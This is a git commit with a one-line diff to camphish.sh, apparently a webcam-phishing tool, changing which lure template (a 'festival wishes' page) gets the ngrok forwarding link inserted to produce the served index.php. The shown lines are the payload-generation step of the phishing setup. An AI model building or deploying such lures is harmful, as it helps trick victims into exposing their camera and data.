e19d3cca54e8fb9e5acf0c64608688fdd3f8d87e
Rafid656 <mdabuinkiadrafid@gmail.com>
2025-12-16 15:16:37 +0600

    Update camphish.sh

--- camphish.sh
+++ camphish.sh
@@ -123,7 +123,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
